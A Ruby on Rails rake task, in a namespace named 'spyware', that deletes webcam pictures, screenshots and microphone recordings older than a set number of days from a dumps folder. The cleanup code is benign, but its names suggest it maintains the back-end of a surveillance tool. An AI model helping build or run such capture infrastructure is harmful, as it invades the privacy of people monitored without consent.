namespace :spyware do
  desc "Remove data older than X days"
  task clean_old_data: :environment do
    days = ENV.fetch('DATA_RETENTION_DAYS', 30).to_i
    limit = Time.now - days.days
    
    puts "[Cleanup] Removing data older than #{days} days (before #{limit})..."

    # 1. Pictures
    puts "Processing Pictures..."
    Picture.where('created_at < ?', limit).find_each do |rec|
      path = Rails.root.join('files', 'dumps', 'pictures', rec.filename)
      if File.exist?(path)
        File.delete(path) 
        puts "  Deleted #{path}"
      end
      rec.destroy
    end

    # 2. Screenshots
    puts "Processing Screenshots..."
    Screenshot.where('created_at < ?', limit).find_each do |rec|
      path = Rails.root.join('files', 'dumps', 'screen_snaps', rec.filename)
      if File.exist?(path)
        File.delete(path)
        puts "  Deleted #{path}"
      end
      rec.destroy
    end

    # 3. Recordings
    puts "Processing Recordings..."
    Recording.where('created_at < ?', limit).find_each do |rec|
      path = Rails.root.join('files', 'dumps', 'microphone_recs', rec.filename)
      if File.exist?(path)
        File.delete(path)
        puts "  Deleted #{path}"
      end
      rec.destroy
    end

    puts "[Cleanup] Done."
  end
end
